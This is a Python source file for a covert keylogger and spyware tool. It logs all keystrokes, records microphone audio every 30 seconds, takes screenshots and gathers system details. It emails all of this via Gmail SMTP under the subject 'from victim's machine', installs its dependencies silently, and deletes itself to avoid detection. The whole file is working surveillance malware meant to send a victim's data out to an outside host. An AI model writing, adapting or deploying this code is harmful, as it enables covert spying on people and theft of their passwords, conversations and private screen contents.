try:
    import os
    import platform
    import smtplib #for email sending
    import socket
    import threading
    import sounddevice as sd #for audio recording 
    import wave #for audio recording 
    import io
    from email.mime.image import MIMEImage
    from datetime import datetime #for tmestamps
    #email libraries to create annd send emails
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
#if any required module is missing insttall it using pip
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot","sounddevice","pynput"]
    call("pip install " + ' '.join(modules), shell=True)


finally:
    #let's start
    EMAIL_ADDRESS = "" #here u put ur email address
    EMAIL_PASSWORD = "" #here the generated password
    SEND_REPORT_EVERY = 30 # time between the reports that will be sent in seconds
    #now we're going to startdefining our keylogger class
    class KeyLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval #define the time between reports
            self.log = "" #variable where we are going to store captured keystrokes
            self.email = email 
            self.password = password
            self.is_recording = False
        
        def appendlog(self, string):#for appending the keystrokes to self.log
            self.log = self.log + string
        def save_data(self, key): #here the method that captures the keys
                   # Handle printable characters
                 current_key = key.name  # 'name' contains the string representation of the key
                 if current_key == 'space':
                    current_key = ' '  # Replace 'space' with an actual space
                 elif current_key == 'impr.ecran':
                     current_key = "[PRINT_SCREEN]"
                     self.screenshot()  # Take a screenshot if the 'impr.ecran' key is pressed
 
                 elif len(current_key) > 1:
                     # Handles special keys like 'enter', 'backspace', etc.
                    current_key = f'[{current_key}]'
                 timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S") #capture the exactly time of doing the action 

                  # Append the log entry with the timestamp
                 self.appendlog(f"[{timestamp}] : {current_key}\n")
 
                

        def send_mail(self, email, password, message, image=None,  file_data=None): #this is the method that sends logs and screenshots and audio recordings as email attachments
            sender = ""
            receiver = ""

    # Create the email message
            from email.mime.multipart import MIMEMultipart
            msg = MIMEMultipart()
            msg['From'] = sender
            msg['To'] = receiver
            msg['Subject'] = "from victim's machine"

    # Attach the message content with UTF-8 encoding
            from email.mime.text import MIMEText
            msg.attach(MIMEText(message, 'plain'))
    # now let's work on audio and images if they are attached
            from email.mime.base import MIMEBase
            from email import encoders
            if file_data:
                  part = MIMEBase('application', 'octet-stream') #defines an object that will be holding the binary audio  
                  part.set_payload(file_data.read()) #read the attached binary audio andput the content in part object  
                  encoders.encode_base64(part) #encodes the binary audio in base64 because binary data like audio can contain characters that might interfere with email transmission protocols
                  timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S") 
                  filename = f"audio_recording_{timestamp}.wav"#put in the audio file nme the time for better undrestanding
                  part.add_header('Content-Disposition', 'attachment', filename=filename) #tell the email client that the audio is an attachment 
                  msg.attach(part) #addint the part obect in to the msg
            if image:
        # Open the image in binary mode
                    image_attachment = MIMEImage(image, _subtype='png')  # Use the image bytes directly
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S") 
                    filename = f"screenshot{timestamp}.png"
                    image_attachment.add_header('Content-Disposition', 'attachment', filename=filename)
                    msg.attach(image_attachment)

         
            with smtplib.SMTP("smtp.gmail.com", 587) as server: #creates a connection with an smtp server to send emails and ensure it closes after the email s sent 
                   server.starttls()  # upgrades the connection to use TLS for security (cryptography)
                   server.login(email, password) #loging to the server using the credentials
                   server.sendmail(sender, receiver, msg.as_string())  # Send the email as a string
        def report(self):
            if self.log.strip(): #ensure the log is not empty 
                 self.send_mail(self.email, self.password, "\n\n" + self.log)
            self.log = "" #resets the log to avoid sending the same data twice
            timer = threading.Timer(self.interval, self.report) #sets a time to call the report methos again 
            timer.start() # starts the timer in the next execution 

        def system_information(self): #this method is responsible for collecting and logging detailed infos about the system on which the script is running
            hostname = socket.gethostname() #get the hostname ogf the machine on the local network  
            ip = socket.gethostbyname(hostname) #the ip address of the machine in the network 
            processor = platform.processor() # the name of the processor in the the machine 
            system = platform.system() # the name of the OS      
            machine = platform.machine() # the architecture of the machine
            system_info = (
                 f"Hostname: {hostname}\n"
                 f"IP Address: {ip}\n"
                 f"Processor: {processor}\n"
                 f"System: {system}\n"
                 f"Machine: {machine}\n"
            ) #combine the data
            self.appendlog(f"\n[System Information]\n{system_info}\n") #   add these infos to the log
        def record_audio(self):
         from datetime import datetime
         import  numpy as np
         from io import BytesIO 
         try:
             fs = 44100  # Sample rate
             seconds = 30  # Duration of recording
             timestamp = datetime.now().strftime('%Y-%m-%d %H-%M-%S')
             myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1) #starts recording 
             sd.wait()  # Wait until recording is finished
             myrecording = np.int16(myrecording / np.max(np.abs(myrecording)) * 32767) #normalize the audio 

             # Create an in-memory buffer 
             buffer = BytesIO() #create the buffer to store the audio
             with wave.open(buffer, 'wb') as obj: #open the buffer to write on it
                 obj.setnchannels(1)  # mono
                 obj.setsampwidth(2)  # 2 bytes per sample
                 obj.setframerate(fs)
                 obj.writeframes(myrecording.tobytes())  #Converts the NumPy array myrecording to bytes and writes it to the WAV file
        
        # Move the buffer pointer to the beginning before sending so it can be read later
             buffer.seek(0)

        # Send the recorded audio via email (attachment)
             self.send_mail(self.email, self.password, 'Microphone Recording', file_data=buffer)

        # Log the action
             self.appendlog(f"[{timestamp}] Audio recorded and sent via email.")
        
        # Recur the audio recording
             threading.Timer(self.interval, self.record_audio).start() # a timer to record again after the audio is sent

         except Exception as e:
             print(f"Error recording audio: {e}")

        def screenshot(self):
             import pyscreenshot
             try:
                 img = pyscreenshot.grab()  # Capture screenshot

                 # Convert the screenshot into bytes
                 img_byte_arr = io.BytesIO()
                 img.save(img_byte_arr, format='PNG')  # Save the image as PNG in a byte stream
                 img_byte_arr.seek(0)  # Move cursor to the beginning of the byte stream

        # Send the screenshot as an email attachment
                 self.send_mail(
                     self.email,
                     self.password,
                     'Screenshot captured at {}'.format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
                      image=img_byte_arr.getvalue()
                )

                 # Log the action
                 timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                 self.appendlog(f"[{timestamp}] Screenshot captured and sent.")
             except Exception as e:
                 print(f"Error capturing screenshot: {e}")

        def run(self): #the main execution point for the script
            import keyboard
            keyboard.on_press(self.save_data)#every time a key is pressed the save_data method is triggered 
            self.system_information()
            self.report()
            self.record_audio()
            keyboard.wait() # keeps the program running
            #this part of the script will do the work of deleting the file when the victim knows about it and stop it 
            if os.name == "nt": #cheks if the operating system is windows
                try:
                    pwd = os.path.abspath(os.getcwd()) #gits the path of the current working directory
                    os.system("cd " + pwd)
                    os.system("TASKKILL /F /IM " + os.path.basename(__file__)) # terminates the script's process forcefully
                    os.system("DEL " + os.path.basename(__file__)) #delete the script file from the system
                except OSError:
                    print('File is close.')

            else: #Unix/Linux
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system('pkill leafpad')
                    os.system("chattr -i " +  os.path.basename(__file__))
                    print('File was closed.')
                    os.system("rm -rf" + os.path.basename(__file__))
                except OSError:
                    print('File is close.')

    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()
